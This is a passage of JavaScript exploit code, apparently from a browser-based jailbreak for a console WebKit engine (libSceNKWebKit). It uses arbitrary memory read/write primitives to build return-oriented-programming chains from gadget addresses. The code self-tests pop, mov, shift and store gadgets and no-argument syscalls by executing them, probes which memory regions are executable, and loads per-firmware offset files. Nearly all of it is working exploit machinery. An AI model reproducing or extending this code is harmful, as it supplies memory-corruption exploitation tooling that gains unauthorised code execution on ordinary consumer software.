                jbmark("TEXT-MAP", ps.gt["exec:pop rdx"] === "ok"
                    ? "skipped: pop rdx executes at 0x"
                    + wk_gadgetmap["pop rdx"].toString(16) + ", so that region IS"
                    + " live code and the addresses are merely inaccurate"
                    : "deferred: waiting on the pop rdx result first");
                ps.rd = ps.rd || {};
            } else {
            ps.rd = ps.rd || {};
            for (const k in ps.rd) if (ps.rd[k] === "pending") ps.rd[k] = "FAULT";
            psSave();
            for (const rva of [0x214613, 0x572686, 0x35F9049]) {
                const key = "0x" + rva.toString(16);
                if (ps.rd[key]) continue;
                crumb("rd:" + key);
                ps.rd[key] = "pending";
                psSave();
                const v = p.read8(libSceNKWebKitBase.add32(rva));
                ps.rd[key] = "readable:" + (v.low & 0xffff).toString(16);
                psSave();
                break;                       // one per run; a fault ends it anyway
            }
            jbmark("TEXT-MAP", Object.keys(ps.rd).map(k => k + "=" + ps.rd[k]).join(" ")
                + " || readable => that region is DATA, so no gadget there is"
                + " usable; FAULT => it is execute-only code and the addresses"
                + " are merely biased");
            }

            /* pop rdx FIRST. Every test costs a reload when it crashes, so the
               open question goes at the front rather than queued behind ones
               whose answers we already have. This decides whether the region
               above ~1.2MB is live code at all, which determines whether the
               other bad gadgets are recoverable by correcting addresses or not
               recoverable at all -- worth more than any single gadget. */
            {
                const V0 = new int64(0x41414141, 0x00004141);
                const M0 = new int64(0x5A5A5A5A, 0x00005A5A);
                await runTest("exec:pop rdx", () => {
                    chain.push(gadgets["pop rdx"]); chain.push(V0);
                    chain.push(gadgets["pop rax"]); chain.push(M0);
                }, (v) => v.low === M0.low && v.hi === M0.hi);
                /* Name the address that RAN. pop rdx comes from libc now, so
                   printing wk_gadgetmap's 0x21461c next to "ok" credits the
                   gadget that does not work with the result of the one that
                   does -- exactly the kind of thing that cost eight runs
                   earlier in this port. */
                const src = LC_SOURCED["pop rdx"]
                    ? "lc+0x" + lc_gadgetmap["pop rdx"].toString(16)
                    : "wk+0x" + wk_gadgetmap["pop rdx"].toString(16);
                jbmark("POP-RDX", src + " => " + (ps.gt["exec:pop rdx"] || "?")
                    + (LC_SOURCED["pop rdx"]
                        ? " (wk+0x" + wk_gadgetmap["pop rdx"].toString(16)
                        + " is still bad -- this is libc's)" : ""));
            }

            /* Syscalls first, because they are the most informative test left
               and each crash costs a whole reload.
               write_result -- `mov [rdi], rax` -- is already trusted: every
               launch_chain does three push_write8 calls and then longjmp
               returns through the values they wrote, and the worker comes back
               correctly, so that store demonstrably works. getpid therefore
               really did return -1 rather than being mis-captured.
               getpid/getuid/getgid/getppid cannot fail and have known-shaped
               results: all four wrong means the calling convention is wrong,
               one wrong means only that stub is. */
            for (const [nm, nr, ck] of [
                ["syscall:getpid", 0x14, (v) => v.hi === 0 && v.low > 0 && v.low < 0x100000],
                ["syscall:sched_yield", 0x14b, (v) => v.hi === 0 && v.low === 0],
                ["syscall:getuid", 0x18, (v) => v.hi === 0 && v.low < 0x100000],
                ["syscall:getgid", 0x2f, (v) => v.hi === 0 && v.low < 0x100000],
                ["syscall:getppid", 0x1b, (v) => v.hi === 0 && v.low < 0x100000]]) {
                if (!(nr in syscall_map)) continue;
                /* Only stubs whose console address was READ out of the GOT.
                   On 7.00.00.70 the stub block gained entries, so an address
                   this suite merely interpolated may be a different syscall
                   entirely -- and calling one of those with junk arguments is
                   how a diagnostic turns into a crash. */
                if (SHIFT && SHIFT.exact && !SHIFT.exact[nr]) continue;
                await runTest(nm, () => { chain.fcall(syscalls[nr]); }, ck);
            }

            p.write8(cell, new int64(0xCAFEBABE, 0x00001234));
            await runTest("mov rax,[rax]", () => {
                chain.push(gadgets["pop rax"]); chain.push(cell);
                chain.push(gadgets["mov rax, [rax]"]);
            }, (v) => eq(v, 0xCAFEBABE, 0x00001234));

            await runTest("add rax,rcx", () => {
                chain.push(gadgets["pop rax"]); chain.push(new int64(0x1000, 0));
                chain.push(gadgets["pop rcx"]); chain.push(new int64(0x234, 0));
                chain.push(gadgets["add rax, rcx"]);
            }, (v) => eq(v, 0x1234, 0));

            for (const [g, exp] of [["shl rax, 3", 0x800], ["shr rax, 3", 0x20],
                                    ["shl rax, 4", 0x1000], ["shr rax, 4", 0x10]]) {
                if (!(g in wk_gadgetmap)) continue;
                await runTest(g, () => {
                    chain.push(gadgets["pop rax"]); chain.push(new int64(0x100, 0));
                    chain.push(gadgets[g]);
                }, (v) => eq(v, exp, 0));
            }

            // push_write4 uses `mov [rdi], eax`, a different store from the
            // 8-byte path, so it needs its own check. Both go through runTest
            // so they are skipped once decided, like every other test.
            /* push_write4 is a FOUR byte store, so it must leave the high
               dword alone. Checking hi === 0 was my error, not the gadget's:
               it reported 0xdead000041424344, which is the filler above and
               the value below -- exactly correct behaviour. */
            p.write8(out, new int64(0xDEAD0000, 0xDEAD0000));
            await runTest("push_write4", () => {
                chain.push_write4(out, 0x41424344);
            }, (v) => eq(v, 0x41424344, 0xDEAD0000), true);

            p.write8(cell, new int64(0x55667788, 0x00009900));
            await runTest("push_copy8", () => {
                chain.push_copy8(out, cell);
            }, (v) => eq(v, 0x55667788, 0x00009900), true);

            /* Every gadget verified so far sits at or below rva 0x12A439 and
               every broken one at or above 0x572686 -- nothing straddles. That
               is the shape of a segment boundary, not five unlucky addresses:
               libSceNKWebKit's executable text appears to end between those,
               and the generator harvested "gadgets" out of the data beyond it,
               which fault the moment they are executed.
               Test the rest in ASCENDING rva order so the point where they
               start failing localises that boundary. Each one only has to
               execute, consume the slots the profile implies, and return --
               MAGIC2 loaded afterwards proves the chain stayed in sync. */
            const V = new int64(0x41414141, 0x00004141);
            const MAGIC2 = new int64(0x5A5A5A5A, 0x00005A5A);
            const r9zero = (typeof OFFSET_wk_r9_zero_only !== "undefined")
                && OFFSET_wk_r9_zero_only;
            const pop1 = (n) => () => { chain.push(gadgets[n]); chain.push(V); };
            const flag0 = (n) => () => { chain.push(gadgets[n]); };
            const EXEC = [
                ["sete al", flag0("sete al")],
                ["setb al", flag0("setb al")],
                ["inc dword [rax]", () => {
                    chain.push(gadgets["pop rax"]); chain.push(cell);
                    chain.push(gadgets["inc dword [rax]"]);
                }],
                ["pop rdx", pop1("pop rdx")],
                ["seta al", flag0("seta al")],
                ["pop r8", pop1("pop r8")],
                ["setl al", flag0("setl al")],
                ["pop r9", () => {
                    chain.push(gadgets["pop r9"]);
                    if (!r9zero) chain.push(V);   // the stand-in eats no slot
                }],
                ["setg al", flag0("setg al")],
                ["cmp [rcx], eax", () => {
                    chain.push(gadgets["pop rcx"]); chain.push(cell);
                    chain.push(gadgets["pop rax"]); chain.push(new int64(0, 0));
                    chain.push(gadgets["cmp [rcx], eax"]);
                }]
            ];
            for (const [nm, build] of EXEC) {
                if (!(nm in wk_gadgetmap)) continue;
                await runTest("exec:" + nm, () => {
                    build();
                    chain.push(gadgets["pop rax"]); chain.push(MAGIC2);
                }, (v) => eq(v, MAGIC2.low, MAGIC2.hi));
            }

            crumb("g:done");
            jbmark("GADGET-SELFTEST", bad.length
                ? "FAILED " + bad.length + ": " + bad.join("  ")
                : "all verified by execution (load, add, shifts, write4, copy8,"
                + " and four no-arg syscalls)");
            if (bad.length)
                jbmark("GADGET-BROKEN", bad.join("  ")
                    + " || these addresses in offsets/" + window.fw_str + ".js do"
                    + " not do what the profile says. Reporting rather than"
                    + " aborting: the chain works without the ones it never"
                    + " uses, and each completed run tells us more than a stop.");
        } catch (e) {
            if (String(e.message || e).indexOf("gadget self-test") === 0) throw e;
            jbmark("GADGET-SELFTEST", "aborted: " + (e.message || e));
        }
    }

    return { p: p2, chain: chain };
}
let fwScript = document.createElement('script');
document.body.appendChild(fwScript);

window.__offsetsScript = fwScript;
/* Same per-load stamp as the page used for main.js: the profile is the
   file most likely to have just changed, so it must never come from cache. */
fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js`
    + (window.__cb || '?v=57'));
